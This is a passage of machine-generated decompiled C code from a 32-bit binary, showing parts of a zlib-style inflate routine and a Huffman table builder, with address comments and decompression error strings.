    *v7 = v53;
    *v2 = v66;
    int32_t result2 = (int32_t)v76; // 0x404269
    *v1 = result2;
    *v26 = result2 - *v1 + *v26;
    *v3 = v39;
    // 0x404278
    *v18 = a2;
    *v19 = a1;
    return result2;
  lab_0x4041c7_10:
    // 0x4041c7
    *v5 = v86;
    *v7 = v85;
    *v2 = v84;
    int32_t v129 = (int32_t)v78; // 0x4041c7
    *v17 = v48;
    *v1 = v129;
    *v26 = v129 - *v1 + *v26;
    *v3 = v42;
    result = v129;
    goto lab_0x404278;
  lab_0x404090:;
    // 0x404090
    int32_t v130; // 0x403cfc
    char * v131; // 0x403cfc
    *(char *)v130 = *v131;
    int32_t v132 = (int32_t)v131 + 1; // 0x40409c
    int32_t v133 = v132; // 0x4040a9
    if (v132 == *v10) {
        // 0x4040ab
        v133 = *v16;
    }
    int32_t v134 = v130 + 1; // 0x40409b
    int32_t v135; // 0x403cfc
    int32_t v136 = v135 - 1; // 0x40409f
    int32_t v137 = *v23 - 1; // 0x4040b1
    *v23 = v137;
    int32_t v138 = 0; // 0x4040b4
    char * v139 = (char *)v133; // 0x4040b4
    int32_t v140 = v136; // 0x4040b4
    int32_t v141 = v134; // 0x4040b4
    int32_t v142; // 0x403cfc
    int32_t v143 = v142; // 0x4040b4
    int32_t v144; // 0x403cfc
    int32_t v145 = v144; // 0x4040b4
    char * v146; // 0x403cfc
    char * v147 = v146; // 0x4040b4
    int32_t v148; // 0x403cfc
    int32_t v149 = v148; // 0x4040b4
    int32_t v150 = v136; // 0x4040b4
    int32_t v151 = 0; // 0x4040b4
    int32_t v152 = v134; // 0x4040b4
    if (v137 == 0) {
        // break -> 0x404157
        goto lab_0x404157_2;
    }
    goto lab_0x404002;
  lab_0x404032:;
    // 0x404032
    int32_t v154; // 0x403cfc
    *v17 = v154;
    int32_t v157; // 0x403cfc
    *v3 = v157;
    *v18 = a2;
    *v19 = a1;
    int32_t v161 = *v3; // 0x40403f
    uint32_t v162 = *v8; // 0x404045
    int32_t v163; // 0x403cfc
    int32_t v164; // 0x403cfc
    if (v161 >= v162) {
        int32_t v165 = *v10; // 0x404057
        v163 = v165;
        v164 = v165 - v161;
    } else {
        // 0x404052
        v163 = *v10;
        v164 = v162 + -1 - v161;
    }
    int32_t v166 = v164;
    int32_t v167 = v163; // 0x40405c
    int32_t v168 = v166; // 0x404067
    int32_t v169 = v161; // 0x404067
    if (v161 == v167) {
        int32_t v170 = *v16; // 0x404069
        v168 = v166;
        v169 = v161;
        if (v162 != v170) {
            if (v170 >= v162) {
                // 0x40407e
                v168 = v167 - v170;
                v169 = v170;
            } else {
                // 0x404079
                v168 = v162 + -1 - v170;
                v169 = v170;
            }
        }
    }
    // 0x404088
    v135 = v168;
    v130 = v169;
    v86 = v142;
    v85 = v144;
    v84 = v148;
    v78 = v146;
    int32_t v156; // 0x403cfc
    v48 = v156;
    v42 = v169;
    if (v168 == 0) {
        goto lab_0x4041c7_10;
    }
    goto lab_0x404090;
  lab_0x403dfd:;
    int32_t v171 = v45;
    int32_t v172 = v50;
    int32_t v173 = v75;
    int32_t v174 = v70;
    char * v175 = v81;
    int32_t v176 = v57;
    int32_t v177 = v64;
    uint32_t v178 = *v22; // 0x403dfd
    int32_t v179 = v177; // 0x403e03
    int32_t v180 = v176; // 0x403e03
    char * v181 = v175; // 0x403e03
    int32_t v182 = v174; // 0x403e03
    int32_t v183 = v172; // 0x403e03
    if (v176 < v178) {
        int32_t v184 = v177; // 0x403e09
        int32_t v185 = v176; // 0x403e09
        char * v186 = v175; // 0x403e09
        int32_t v187 = v174; // 0x403e09
        v86 = v177;
        v85 = v176;
        v84 = 0;
        v78 = v175;
        v48 = v172;
        v42 = v171;
        if (v174 == 0) {
            goto lab_0x4041c7_10;
        }
        v187--;
        v184 |= (int32_t)*v186 << (v185 & 31);
        v186 = (char *)((int32_t)v186 + 1);
        v185 += 8;
        v179 = v184;
        v180 = v185;
        v181 = v186;
        v182 = v187;
        v183 = 0;
        while (v185 < v178) {
            // 0x403e05
            v86 = v184;
            v85 = v185;
            v84 = 0;
            v78 = v186;
            v48 = 0;
            v42 = v171;
            if (v187 == 0) {
                goto lab_0x4041c7_10;
            }
            v187--;
            v184 |= (int32_t)*v186 << (v185 & 31);
            v186 = (char *)((int32_t)v186 + 1);
            v185 += 8;
            v179 = v184;
            v180 = v185;
            v181 = v186;
            v182 = v187;
            v183 = 0;
        }
    }
    int32_t v188 = v183;
    int32_t v189 = v182;
    char * v190 = v181;
    int32_t v191 = *(int32_t *)(4 * v178 + (int32_t)&unlzx_table_three_at_40bca8); // 0x403e2d
    int32_t v192 = 8 * (v191 & v179) + *v21; // 0x403e3a
    unsigned char v193 = *(char *)(v192 + 1); // 0x403e40
    int32_t v194 = v179 >> (int32_t)(v193 & 31);
    int32_t v195 = v180 - (int32_t)v193; // 0x403e4e
    unsigned char v196 = *(char *)v192; // 0x403e51
    int32_t v197; // 0x403cfc
    int32_t v198; // 0x403cfc
    int32_t v199; // 0x403cfc
    int32_t v200; // 0x403cfc
    int32_t v201; // 0x403cfc
    int32_t v202; // 0x403cfc
    int32_t v203; // 0x403cfc
    int32_t v204; // 0x403cfc
    char * v205; // 0x403cfc
    if (v196 != 0) {
        int32_t v206 = v196; // 0x403e51
        if ((v206 & 16) == 0) {
            // 0x403e84
            v202 = v194;
            v201 = v195;
            v205 = v190;
            v203 = v189;
            v204 = v173;
            v200 = v188;
            v197 = v206;
            v198 = v192;
            v199 = v171;
            if ((v206 & 64) == 0) {
                goto lab_0x403f71;
            } else {
                if ((v206 & 32) == 0) {
                    // 0x404171
                    *v15 = 9;
                    *(int32_t *)(a2 + 24) = (int32_t)"invalid literal/length code";
                    v62 = v194;
                    v54 = v195;
                    v77 = v190;
                    v67 = v189;
                    v41 = v171;
                    goto lab_0x40417e;
                }
                // 0x403e94
                *v15 = 7;
                v29 = v194;
                v30 = v195;
                v31 = v190;
                v32 = v189;
                v33 = v173;
                v34 = v188;
                v35 = v171;
                goto lab_0x403d3c_2;
            }
        } else {
            // 0x403e70
            *v21 = v206 & 15;
            *v23 = *(int32_t *)(v192 + 4);
            *v15 = 2;
            v29 = v194;
            v30 = v195;
            v31 = v190;
            v32 = v189;
            v33 = v173;
            v34 = v188;
            v35 = v171;
            goto lab_0x403d3c_2;
        }
    } else {
        // 0x403e58
        *v15 = 6;
        *v21 = *(int32_t *)(v192 + 4);
        v29 = v194;
        v30 = v195;
        v31 = v190;
        v32 = v189;
        v33 = v173;
        v34 = v188;
        v35 = v171;
        goto lab_0x403d3c_2;
    }
  lab_0x403ef7:;
    int32_t v207 = v51;
    int32_t v208 = v71;
    char * v209 = v82;
    int32_t v210 = v58;
    int32_t v211 = v65;
    uint32_t v212 = *v22; // 0x403ef7
    int32_t v213 = v211; // 0x403efd
    int32_t v214 = v210; // 0x403efd
    char * v215 = v209; // 0x403efd
    int32_t v216 = v208; // 0x403efd
    int32_t v217 = v207; // 0x403efd
    if (v210 < v212) {
        int32_t v218 = v211; // 0x403f03
        int32_t v219 = v210; // 0x403f03
        char * v220 = v209; // 0x403f03
        int32_t v221 = v208; // 0x403f03
        v86 = v211;
        v85 = v210;
        v84 = 0;
        v78 = v209;
        v48 = v207;
        v42 = v39;
        if (v208 == 0) {
            goto lab_0x4041c7_10;
        }
        v221--;
        v218 |= (int32_t)*v220 << (v219 & 31);
        v220 = (char *)((int32_t)v220 + 1);
        v219 += 8;
        v213 = v218;
        v214 = v219;
        v215 = v220;
        v216 = v221;
        v217 = 0;
        while (v219 < v212) {
            // 0x403eff
            v86 = v218;
            v85 = v219;
            v84 = 0;
            v78 = v220;
            v48 = 0;
            v42 = v39;
            if (v221 == 0) {
                goto lab_0x4041c7_10;
            }
            v221--;
            v218 |= (int32_t)*v220 << (v219 & 31);
            v220 = (char *)((int32_t)v220 + 1);
            v219 += 8;
            v213 = v218;
            v214 = v219;
            v215 = v220;
            v216 = v221;
            v217 = 0;
        }
    }
    int32_t v222 = v217;
    int32_t v223 = v216;
    char * v224 = v215;
    int32_t v225 = *(int32_t *)(4 * v212 + (int32_t)&unlzx_table_three_at_40bca8); // 0x403f27
    int32_t v226 = 8 * (v225 & v213) + *v21; // 0x403f34
    unsigned char v227 = *(char *)(v226 + 1); // 0x403f3a
    int32_t v228 = v213 >> (int32_t)(v227 & 31);
    int32_t v229 = v214 - (int32_t)v227; // 0x403f48
    unsigned char v230 = *(char *)v226; // 0x403f4b
    int32_t v231 = v230; // 0x403f4b
    if ((v230 & 16) == 0) {
        // 0x403f69
        v202 = v228;
        v201 = v229;
        v205 = v224;
        v203 = v223;
        v204 = v73;
        v200 = v222;
        v197 = v231;
        v198 = v226;
        v199 = v39;
        if ((v231 & 64) != 0) {
            // 0x4041a6
            *v15 = 9;
            *(int32_t *)(a2 + 24) = (int32_t)"invalid distance code";
            v62 = v228;
            v54 = v229;
            v77 = v224;
            v67 = v223;
            v41 = v39;
            goto lab_0x40417e;
        }
        goto lab_0x403f71;
    } else {
        // 0x403f52
        *v21 = v231 & 15;
        *v22 = *(int32_t *)(v226 + 4);
        *v15 = 4;
        v29 = v228;
        v30 = v229;
        v31 = v224;
        v32 = v223;
        v33 = v73;
        v34 = v222;
        v35 = v39;
        goto lab_0x403d3c_2;
    }
  lab_0x404230:
    // 0x404230
    *v17 = 1;
    *v5 = v60;
    *v7 = v55;
    *v2 = v68;
    int32_t result3 = (int32_t)v79; // 0x404244
    *v1 = result3;
    *v26 = result3 - *v1 + *v26;
    *v3 = v43;
    // 0x404278
    *v18 = a2;
    *v19 = a1;
    return result3;
  lab_0x40417e:
    // 0x40417e
    *v17 = -3;
    *v5 = v62;
    *v7 = v54;
    *v2 = v67;
    int32_t result4 = (int32_t)v77; // 0x404192
    *v1 = result4;
    *v26 = result4 - *v1 + *v26;
    *v3 = v41;
    // 0x404278
    *v18 = a2;
    *v19 = a1;
    return result4;
  lab_0x403dea:
    // 0x403dea
    *v22 = (int32_t)*v28;
    *v21 = *v27;
    *v15 = 1;
    v64 = v63;
    v57 = v56;
    v81 = v80;
    v70 = v69;
    v75 = v74;
    v50 = v49;
    v45 = v44;
    goto lab_0x403dfd;
  lab_0x403fd0:
    // 0x403fd0
    v148 = v72;
    v146 = v83;
    v144 = v59;
    v142 = v61;
    uint32_t v232 = *v16; // 0x403fd0
    uint32_t v233 = v39 - v36; // 0x403fd5
    char * v234 = (char *)v233; // 0x403fda
    char * v235 = v234; // 0x403fdd
    if (v233 < v232) {
        uint32_t v236 = *v10 - v232 + (int32_t)v234; // 0x403fea
        char * v237 = (char *)v236;
        v235 = v237;
        while (v236 < v232) {
            // 0x403fe7
            v236 = *v10 - v232 + (int32_t)v237;
            v237 = (char *)v236;
            v235 = v237;
        }
    }
    // 0x403ff5
    v138 = v52;
    v139 = v235;
    v140 = v73;
    v141 = v39;
    v143 = v142;
    v145 = v144;
    v147 = v146;
    v149 = v148;
    v150 = v73;
    v151 = v52;
    v152 = v39;
    if (*v23 != 0) {
        while (true) {
          lab_0x404002:;
            int32_t v153 = v141;
            v131 = v139;
            v135 = v140;
            v130 = v153;
            if (v140 != 0) {
                goto lab_0x404090;
            } else {
                // 0x40400a
                v154 = v138;
                int32_t v155 = *v10; // 0x40400a
                v156 = v155;
                v157 = v153;
                if (v153 != v155) {
                    goto lab_0x404032;
                } else {
                    uint32_t v158 = *v8; // 0x404014
                    int32_t v159 = *v16; // 0x404017
                    if (v158 == v159) {
                        goto lab_0x404032;
                    } else {
                        int32_t v160 = v159 >= v158 ? v155 - v159 : v158 + -1 - v159;
                        v156 = v160;
                        v157 = v159;
                        v135 = v160;
                        v130 = v159;
                        if (v160 != 0) {
                            goto lab_0x404090;
                        } else {
                            goto lab_0x404032;
                        }
                    }
                }
            }
        }
    }
    goto lab_0x404157_2;
  lab_0x404149:
    // 0x404149
    *(char *)v40 = *(char *)v20;
    v143 = v60;
    v145 = v53;
    v147 = v76;
    v149 = v66;
    v150 = v38 - 1;
    v151 = 0;
    v152 = v40 + 1;
    goto lab_0x404157_2;
  lab_0x403d3c_2:
    // 0x403d3c
    goto lab_0x403d3c_3;
  lab_0x403f71:;
    int32_t v238 = v198;
    *v22 = v197;
    *v21 = 8 * *(int32_t *)(v238 + 4) + v238;
    v29 = v202;
    v30 = v201;
    v31 = v205;
    v32 = v203;
    v33 = v204;
    v34 = v200;
    v35 = v199;
    goto lab_0x403d3c_2;
  lab_0x404157_2:
    // 0x404157
    *v15 = 0;
    v29 = v143;
    v30 = v145;
    v31 = v147;
    v32 = v149;
    v33 = v150;
    v34 = v151;
    v35 = v152;
    goto lab_0x403d3c_2;
  lab_0x4040ef:
    // 0x4040ef
    *v17 = v47;
    *v3 = v46;
    *v18 = a2;
    *v19 = a1;
    int32_t v239 = *v3; // 0x4040fc
    uint32_t v240 = *v8; // 0x404102
    int32_t v241; // 0x403cfc
    int32_t v242; // 0x403cfc
    if (v239 >= v240) {
        int32_t v243 = *v10; // 0x404114
        v241 = v243;
        v242 = v243 - v239;
    } else {
        // 0x40410f
        v241 = *v10;
        v242 = v240 + -1 - v239;
    }
    int32_t v244 = v242;
    int32_t v245 = v241; // 0x404119
    int32_t v246 = v244; // 0x404124
    int32_t v247 = v239; // 0x404124
    if (v239 == v245) {
        int32_t v248 = *v16; // 0x404126
        v246 = v244;
        v247 = v239;
        if (v240 != v248) {
            if (v248 >= v240) {
                // 0x40413b
                v246 = v245 - v248;
                v247 = v248;
            } else {
                // 0x404136
                v246 = v240 + -1 - v248;
                v247 = v248;
            }
        }
    }
    // 0x404145
    v38 = v246;
    v40 = v247;
    v86 = v60;
    v85 = v53;
    v84 = v66;
    v78 = v76;
    v48 = v37;
    v42 = v247;
    if (v246 == 0) {
        goto lab_0x4041c7_10;
    }
    goto lab_0x404149;
}

// Address range: 0x4042af - 0x4042c0
int32_t function_4042af(int32_t a1, int32_t result) {
    // 0x4042af
    return result;
}

// Address range: 0x4042c0 - 0x40432b
int32_t function_4042c0(int32_t a1, int32_t a2, int32_t a3) {
    if (a3 != 0) {
        // 0x4042d1
        *(int32_t *)a3 = *(int32_t *)(a1 + 60);
    }
    int32_t * v1 = (int32_t *)a1; // 0x4042f1
    if (*v1 == 6) {
        // 0x4042f6
        function_4042af(*(int32_t *)(a1 + 4), a2);
    }
    int32_t v2 = *(int32_t *)(a1 + 40); // 0x404301
    *v1 = 0;
    *(int32_t *)(a1 + 52) = v2;
    *(int32_t *)(a1 + 48) = v2;
    int32_t result = *(int32_t *)(a1 + 56); // 0x40430c
    *(int32_t *)(a1 + 28) = 0;
    *(int32_t *)(a1 + 32) = 0;
    if (result != 0) {
        // 0x404319
        *(int32_t *)(a1 + 60) = result;
        *(int32_t *)(a2 + 48) = result;
    }
    // 0x404327
    return result;
}

// Address range: 0x40432b - 0x4043b6
int32_t function_40432b(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40432b
    int32_t v1; // 0x40432b
    int32_t result = v1;
    if (result != 0) {
        // 0x404395
        *(int32_t *)result = 0;
        *(int32_t *)(result + 44) = result + a3;
        *(int32_t *)(result + 56) = a2;
        function_4042c0(result, a1, 0);
    }
    // 0x4043b2
    return result;
}

// Address range: 0x4043b6 - 0x404bbd
// Used cryptographic patterns:
//  - unlzx_table_three (32-bit, little endian)
int32_t function_4043b6(int32_t a1, int32_t a2) {
    uint32_t result = *(int32_t *)a1; // 0x4043f2
    if (result < 10) {
        // 0x404408
        return result;
    }
    // 0x4049c2
    return *(int32_t *)(a1 + 52);
}

// Address range: 0x404be5 - 0x404c19
int32_t function_404be5(int32_t a1, int32_t a2, int32_t a3) {
    // 0x404be5
    function_4042c0(a1, a2, 0);
    return 0;
}

// Address range: 0x404c19 - 0x404fa0
int32_t function_404c19(int32_t a1, uint32_t a2, uint32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t * a9, int32_t a10) {
    // 0x404c19
    int32_t v1; // bp-4, 0x404c19
    int32_t v2 = &v1; // 0x404c1a
    int32_t v3 = 0; // bp-116, 0x404c30
    int32_t v4 = 0; // bp-60, 0x404c5a
    int32_t v5 = v2 - 116; // 0x404c64
    int32_t v6 = a1; // 0x404c5d
    int32_t v7 = a2; // 0x404c5d
    int32_t * v8 = (int32_t *)(4 * *(int32_t *)v6 + v5); // 0x404c64
    *v8 = *v8 + 1;
    v7--;
    v6 += 4;
    while (v7 != 0) {
        // 0x404c5f
        v8 = (int32_t *)(4 * *(int32_t *)v6 + v5);
        *v8 = *v8 + 1;
        v7--;
        v6 += 4;
    }
    if (a2 == 0) {
        // 0x404c74
        *(int32_t *)a6 = 0;
        *(int32_t *)a7 = 0;
        // 0x404c80
        return 0;
    }
    // 0x404c85
    int32_t v9; // bp-256, 0x404c19
    int32_t v10 = &v9; // 0x404c27
    int32_t * v11 = (int32_t *)a7; // 0x404c8e
    uint32_t v12 = *v11; // 0x404c8e
    int32_t v13 = &v3; // 0x404c92
    int32_t v14 = 1; // 0x404c92
    int32_t v15 = v14; // 0x404c97
    while (*(int32_t *)v13 == 0) {
        // 0x404c99
        v14++;
        v13 += 4;
        v15 = 16;
        if (v14 >= 16) {
            // break -> 0x404ca2
            break;
        }
        v15 = v14;
    }
    uint32_t v16 = v15;
    uint32_t v17 = v12 >= v16 ? v12 : v16;
    int32_t v18 = 15; // 0x404cb1
    int32_t v19 = &v4; // 0x404cb1
    while (*(int32_t *)v19 == 0) {
        // 0x404cb6
        v18--;
        v19 -= 4;
        if (v18 == 0) {
            // break -> 0x404cbe
            break;
        }
    }
    uint32_t v20 = v18;
    uint32_t v21 = v17 > v20 ? v20 : v17;
    int32_t v22 = 1 << (v16 & 31);
    *v11 = v21;
    int32_t v23 = v22; // 0x404cd2
    if (v16 < v20) {
        int32_t v24 = v16; // 0x404cd4
        int32_t v25 = 4 * v16 + v5; // 0x404cd4
        int32_t v26 = v22 - *(int32_t *)v25; // 0x404cd8
        while (v26 >= 0) {
            // 0x404ce0
            v24++;
            int32_t v27 = 2 * v26; // 0x404ce4
            v25 += 4;
            v23 = v27;
            if (v24 >= v20) {
                goto lab_0x404cea;
            }
            v26 = v27 - *(int32_t *)v25;
        }
        // 0x404e10
        *(int32_t *)(v10 - 4) = -3;
        // 0x404c80
        return -3;
    }
  lab_0x404cea:;
    int32_t v28 = 4 * v20; // 0x404cec
    int32_t * v29 = (int32_t *)(v28 + v5); // 0x404cef
    int32_t v30 = v23 - *v29; // 0x404cf7
    if (v30 < 0) {
        // 0x404e10
        *(int32_t *)(v10 - 4) = -3;
        // 0x404c80
        return -3;
    }
    // 0x404d02
    *v29 = v23;
    int32_t v31 = v20 - 1; // 0x404d0e
    if (v31 != 0) {
        int32_t v32 = v31; // 0x404d1a
        int32_t v33 = 0; // 0x404d13
        int32_t v34 = 0; // 0x404d17
        v33 += *(int32_t *)(v2 - 112 + v34);
        v34 += 4;
        v32--;
        *(int32_t *)(v2 - 176 + v34) = v33;
        while (v32 != 0) {
            // 0x404d13
            v33 += *(int32_t *)(v2 - 112 + v34);
            v34 += 4;
            v32--;
            *(int32_t *)(v2 - 176 + v34) = v33;
        }
    }
    int32_t v35 = v2 - 180;
    int32_t v36 = a1; // 0x404d27
    int32_t v37 = 0;
    int32_t v38 = *(int32_t *)v36; // 0x404d29
    int32_t * v39; // 0x404d32
    int32_t v40; // 0x404d32
    if (v38 != 0) {
        // 0x404d32
        v39 = (int32_t *)(4 * v38 + v35);
        v40 = *v39;
        *(int32_t *)(4 * v40 + a10) = v37;
        *v39 = v40 + 1;
    }
    int32_t v41 = v37 + 1; // 0x404d4b
    v36 += 4;
    while (v41 < a2) {
        // 0x404d29
        v37 = v41;
        v38 = *(int32_t *)v36;
        if (v38 != 0) {
            // 0x404d32
            v39 = (int32_t *)(4 * v38 + v35);
            v40 = *v39;
            *(int32_t *)(4 * v40 + a10) = v37;
            *v39 = v40 + 1;
        }
        // 0x404d4b
        v41 = v37 + 1;
        v36 += 4;
    }
    if (v16 <= v20) {
        int32_t * v42 = (int32_t *)(v10 - 4);
        int32_t v43 = -v21;
        int32_t v44 = 0;
        uint32_t v45 = v16;
        int32_t v46 = 4 * v16 + v5;
        int32_t v47 = v16 - 1;
        int32_t v48 = 0;
        int32_t v49 = 0;
        int32_t v50 = -1;
        int32_t v51 = *(int32_t *)v46; // 0x404d9e
        int32_t v52 = v50; // 0x404da8
        int32_t v53 = v49; // 0x404da8
        int32_t v54 = a10; // 0x404da8
        int32_t v55 = v48; // 0x404da8
        int32_t v56 = v44; // 0x404da8
        int32_t v57 = v43; // 0x404da8
        int32_t v58; // 0x404c19
        int32_t v59 = v58; // 0x404da8
        int32_t v60; // 0x404c19
        int32_t v61; // 0x404c19
        int32_t v62; // 0x404c19
        int32_t v63; // 0x404c19
        int32_t v64; // 0x404c19
        uint32_t v65; // 0x404c19
        int32_t v66; // 0x404c19
        int32_t v67; // 0x404c19
        int32_t v68; // 0x404c19
        int32_t v69; // 0x404c19
        int32_t v70; // 0x404c19
        int32_t v71; // 0x404c19
        int32_t v72; // 0x404c19
        int32_t v73; // 0x404c19
        int32_t v74; // 0x404c19
        int32_t v75; // 0x404c19
        int32_t v76; // 0x404c19
        int32_t v77; // 0x404c19
        int32_t v78; // 0x404c19
        int32_t v79; // 0x404c19
        int32_t v80; // 0x404c19
        int32_t v81; // 0x404c19
        int32_t v82; // 0x404c19
        int32_t v83; // 0x404c19
        int32_t v84; // 0x404c19
        int32_t v85; // 0x404c19
        int32_t v86; // 0x404c19
        uint32_t v87; // 0x404c19
        int32_t v88; // 0x404c19
        int32_t v89; // 0x404c19
        int32_t v90; // 0x404c19
        int32_t v91; // 0x404c19
        int32_t v92; // 0x404c19
        int32_t v93; // 0x404c19
        int32_t v94; // 0x404c19
        uint32_t v95; // 0x404c19
        int32_t v96; // 0x404c19
        int32_t v97; // 0x404c19
        int32_t v98; // 0x404c19
        int32_t v99; // 0x404c19
        uint32_t v100; // 0x404c19
        int32_t v101; // 0x404c19
        int32_t v102; // 0x404c19
        int32_t v103; // 0x404c19
        int32_t v104; // 0x404c19
        int32_t v105; // 0x404c19
        int32_t v106; // 0x404db1
        int32_t v107; // 0x404dc4
        uint32_t v108; // 0x404dcc
        int32_t v109; // 0x404de0
        int32_t v110; // 0x404c19
        int32_t v111; // 0x404e1d
        uint32_t v112; // 0x404e24
        int32_t v113; // 0x404dfa
        uint32_t v114; // 0x404eb8
        uint32_t v115; // 0x404c19
        int32_t v116; // 0x404c19
        int32_t v117; // 0x404dbf
        int32_t v118; // 0x404e32
        int32_t v119; // 0x404e3b
        int32_t v120; // 0x404e3b
        int32_t v121; // 0x404ed9
        int32_t v122; // 0x404c19
        int32_t v123; // 0x404c19
        int32_t v124; // 0x404e6e
        int32_t v125; // 0x404e79
        int32_t v126; // 0x404c19
        int32_t v127; // 0x404e00
        uint32_t v128; // 0x404e00
        uint32_t v129; // 0x404e06
        int32_t v130; // 0x404c19
        int32_t v131; // 0x404f0e
        int32_t v132; // 0x404dc2
        int32_t v133; // 0x404dfa
        int32_t v134; // 0x404f40
        int32_t v135; // 0x404f56
        int32_t v136; // 0x404f59
        int32_t v137; // 0x404f5c
        if (v51 != 0) {
            // 0x404dae
            v100 = v51;
            v95 = v49;
            v106 = v43 + v21;
            v90 = v50;
            v67 = v106;
            v69 = v43;
            v91 = v50;
            v101 = v48;
            v88 = v44;
            v71 = v43;
            v83 = v58;
            if (v45 > v106) {
                v70 = v69;
                v107 = v70 + v21;
                v108 = v20 - v107;
                v87 = v108 > v21 ? v21 : v108;
                *v42 = 1;
                v109 = v45 - v107;
                v110 = 1 << (v109 & 31);
                v62 = v110;
                v61 = v109;
                if (v110 > v100 && v109 < v87) {
                    // 0x404dfa
                    v113 = v109 + 1;
                    v60 = v113;
                    if (v113 < v87) {
                        // 0x404e00
                        v127 = v46;
                        v63 = v113;
                        v127 += 4;
                        v128 = *(int32_t *)v127;
                        v129 = 2 * (v110 - v100);
                        v60 = v63;
                        while (v129 > v128) {
                            // 0x404dfa
                            v133 = v63 + 1;
                            v68 = v129 - v128;
                            v60 = v133;
                            if (v133 >= v87) {
                                // break -> 0x404e17
                                break;
                            }
                            v63 = v133;
                            v127 += 4;
                            v128 = *(int32_t *)v127;
                            v129 = 2 * v68;
                            v60 = v63;
                        }
                    }
                    // 0x404e17
                    v61 = v60;
                    v62 = 1 << (v61 & 31);
                }
                // 0x404e17
                v76 = v61;
                *v42 = 1;
                v111 = *a9;
                v112 = v111 + v62;
                if (v112 >= 1441) {
                    // 0x404e10
                    *(int32_t *)(v10 - 4) = -3;
                    // 0x404c80
                    return -3;
                }
                // 0x404e2f
                v117 = v90 + 1;
                v118 = 8 * v111 + a8;
                v119 = 4 * v117;
                v120 = v2 - 240 + v119;
                *(int32_t *)v120 = v118;
                *a9 = v112;
                if (v117 == 0) {
                    // 0x404e84
                    *(int32_t *)a6 = v118;
                    v82 = v58;
                } else {
                    // 0x404e50
                    *(int32_t *)(v119 + v35) = v95;
                    v123 = v95 >> (v70 & 31);
                    v124 = *(int32_t *)(v120 - 4);
                    v125 = (v118 - v124 >> 3) - v123;
                    v126 = v124 + 8 * v123;
                    *(int32_t *)v126 = 0x1000000 * v76 >> 24;
                    *(int32_t *)(v126 + 4) = v125;
                    v82 = v125;
                }
                // 0x404e8c
                v132 = v67 + v21;
                v90 = v117;
                v67 = v132;
                v91 = v117;
                v101 = v118;
                v88 = v62;
                v71 = v107;
                v83 = v82;
                while (v45 > v132) {
                    // 0x404dbc
                    v81 = v82;
                    v70 = v107;
                    v107 = v70 + v21;
                    v108 = v20 - v107;
                    v87 = v108 > v21 ? v21 : v108;
                    *v42 = 1;
                    v109 = v45 - v107;
                    v110 = 1 << (v109 & 31);
                    v62 = v110;
                    v61 = v109;
                    if (v110 > v100 && v109 < v87) {
                        // 0x404dfa
                        v113 = v109 + 1;
                        v60 = v113;
                        if (v113 < v87) {
                            // 0x404e00
                            v127 = v46;
                            v63 = v113;
                            v127 += 4;
                            v128 = *(int32_t *)v127;
                            v129 = 2 * (v110 - v100);
                            v60 = v63;
                            while (v129 > v128) {
                                // 0x404dfa
                                v133 = v63 + 1;
                                v68 = v129 - v128;
                                v60 = v133;
                                if (v133 >= v87) {
                                    // break -> 0x404e17
                                    break;
                                }
                                v63 = v133;
                                v127 += 4;
                                v128 = *(int32_t *)v127;
                                v129 = 2 * v68;
                                v60 = v63;
                            }
                        }
                        // 0x404e17
                        v61 = v60;
                        v62 = 1 << (v61 & 31);
                    }
                    // 0x404e17
                    v76 = v61;
                    *v42 = 1;
                    v111 = *a9;
                    v112 = v111 + v62;
                    if (v112 >= 1441) {
                        // 0x404e10
                        *(int32_t *)(v10 - 4) = -3;
                        // 0x404c80
                        return -3;
                    }
                    // 0x404e2f
                    v117 = v90 + 1;
                    v118 = 8 * v111 + a8;
                    v119 = 4 * v117;
                    v120 = v2 - 240 + v119;
                    *(int32_t *)v120 = v118;
                    *a9 = v112;
                    if (v117 == 0) {
                        // 0x404e84
                        *(int32_t *)a6 = v118;
                        v82 = v81;
                    } else {
                        // 0x404e50
                        *(int32_t *)(v119 + v35) = v95;
                        v123 = v95 >> (v70 & 31);
                        v124 = *(int32_t *)(v120 - 4);
                        v125 = (v118 - v124 >> 3) - v123;
                        v126 = v124 + 8 * v123;
                        *(int32_t *)v126 = 0x1000000 * v76 >> 24;
                        *(int32_t *)(v126 + 4) = v125;
                        v82 = v125;
                    }
                    // 0x404e8c
                    v132 = v67 + v21;
                    v90 = v117;
                    v67 = v132;
                    v91 = v117;
                    v101 = v118;
                    v88 = v62;
                    v71 = v107;
                    v83 = v82;
                }
            }
            // 0x404e9a
            v72 = v71;
            v89 = v88;
            v102 = v101;
            v97 = a10;
            v104 = -64;
            v85 = v83;
            if (a10 < 4 * *(int32_t *)(v28 + v35) + a10) {
                // 0x404eb8
                v114 = *(int32_t *)a10;
                if (v114 >= a3) {
                    // 0x404ed3
                    v121 = 4 * (v114 - a3);
                    v103 = (int32_t)(*(char *)(v121 + a5) + 80);
                    v84 = *(int32_t *)(v121 + a4);
                } else {
                    // 0x404ebf
                    v103 = v114 < 256 ? 0 : 96;
                    v84 = v114;
                }
                // 0x404eeb
                v97 = a10 + 4;
                v104 = v103;
                v85 = v84;
            }
            // 0x404eef
            v86 = v85;
            v105 = v104;
            v98 = v97;
            *v42 = 1;
            v115 = v72 & 31;
            v116 = v95 >> v115;
            if (v116 < v89) {
                // 0x404f05
                v122 = 1 << (v45 - v72 & 31);
                v131 = v116;
                v77 = 8 * v116 + v102;
                v131 += v122;
                *(int32_t *)v77 = v105;
                *(int32_t *)(v77 + 4) = v86;
                v77 += 8 * v122;
                while (v131 < v89) {
                    // 0x404f0b
                    v131 += v122;
                    *(int32_t *)v77 = v105;
                    *(int32_t *)(v77 + 4) = v86;
                    v77 += 8 * v122;
                }
            }
            // 0x404f23
            v99 = v100 - 1;
            *v42 = 1;
            v78 = v95;
            v65 = 1 << (v47 & 31);
            v130 = v78 ^ v65;
            v64 = v65 / 2;
            while ((v78 & v65) != 0) {
                // 0x404f2e
                v78 = v130;
                v65 = v64;
                v130 = v78 ^ v65;
                v64 = v65 / 2;
            }
            // 0x404f38
            v134 = 4 * v91 + v35;
            *v42 = 1;
            v73 = v72;
            v66 = v134;
            v92 = v91;
            v93 = v91;
            v74 = v72;
            if ((v130 & -1 - (-1 << v115)) != *(int32_t *)v134) {
                v135 = v92 - 1;
                v136 = v66 - 4;
                v137 = v73 - v21;
                *v42 = 1;
                v73 = v137;
                v66 = v136;
                v92 = v135;
                v93 = v135;
                v74 = v137;
                while ((v130 & -1 - (-1 << (v137 & 31))) != *(int32_t *)v136) {
                    // 0x404f56
                    v135 = v92 - 1;
                    v136 = v66 - 4;
